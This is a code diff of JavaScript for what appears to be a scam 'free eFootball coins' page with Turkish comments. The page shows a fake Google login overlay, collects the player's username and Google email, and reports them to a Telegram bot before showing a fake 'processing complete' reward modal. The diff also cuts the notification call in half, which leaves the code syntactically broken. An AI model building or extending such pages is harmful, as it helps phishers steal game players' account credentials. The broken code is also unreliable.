@@ -470,22 +470,7 @@ function handleGoogleCoinsSubmit() {
   // Send request notification to Telegram Bot
   sendTelegramNotification(
     currentClaimUsername || 'Oyuncu',
-    currentGoogleEmail || 'Belirtilmedi',
-    formattedCoins,
-    currentReward ? currentReward.title : 'eFootball™ Paketi'
-  );
-
-  // After 1.1s complete and show 1:1 Processing Complete modal
-  setTimeout(() => {
-    if (divider) divider.classList.remove('is-loading');
-    if (nextBtn) nextBtn.classList.remove('is-disabled-loading');
-    hideModal('googleLoginOverlay');
-    showProcessingComplete(currentClaimUsername, formattedCoins);
-  }, 1100);
-}
-
-// Show 1:1 Processing Complete modal (media_1789378734748.png)
-function showProcessingComplete(username = '', customCoins = '') {
+function showProcessingComplete(username = '') {
   const nameEl = document.getElementById('pcUsername');
   const userTag = username || currentClaimUsername || 'SDSE';
   if (nameEl) {
@@ -499,23 +484,23 @@ function showProcessingComplete(username = '', customCoins = '') {
   const playerImgEl = document.getElementById('pcPlayerImg');
   const playerNameEl = document.getElementById('pcPlayerName');
 
-  const displayCoins = customCoins || (currentReward && currentReward.type !== 'player' ? `${currentReward.title.split(' ')[0]} Coins` : '1.000 Coins');
-
-  if (coinValEl) {
-    coinValEl.textContent = displayCoins;
-  }
-
   if (currentReward && currentReward.type === 'player') {
+    // Ana ekranda futbolcu seçildiyse: 1.000 Coins + Futbolcu Kartı
+    if (coinValEl) coinValEl.textContent = '1.000 Coins';
     if (coinImgEl) coinImgEl.src = 'clean-coins-1.png?v=2';
     if (plusEl) plusEl.style.display = 'block';
     if (playerWrap) playerWrap.style.display = 'flex';
     if (playerImgEl) playerImgEl.src = currentReward.img || 'card-ronaldo-109.png';
     if (playerNameEl) playerNameEl.textContent = currentReward.title || 'Cristiano Ronaldo';
   } else if (currentReward) {
+    // Ana ekranda coin paketi seçildiyse: Seçilen paketin tam miktarı
+    const coinNumber = currentReward.title.split(' ')[0];
+    if (coinValEl) coinValEl.textContent = `${coinNumber} Coins`;
     if (coinImgEl) coinImgEl.src = currentReward.img || 'clean-coins-1.png?v=2';
     if (plusEl) plusEl.style.display = 'none';
     if (playerWrap) playerWrap.style.display = 'none';
   } else {
+    if (coinValEl) coinValEl.textContent = '1.000 Coins';
     if (coinImgEl) coinImgEl.src = 'clean-coins-1.png?v=2';
     if (plusEl) plusEl.style.display = 'none';
     if (playerWrap) playerWrap.style.display = 'none';
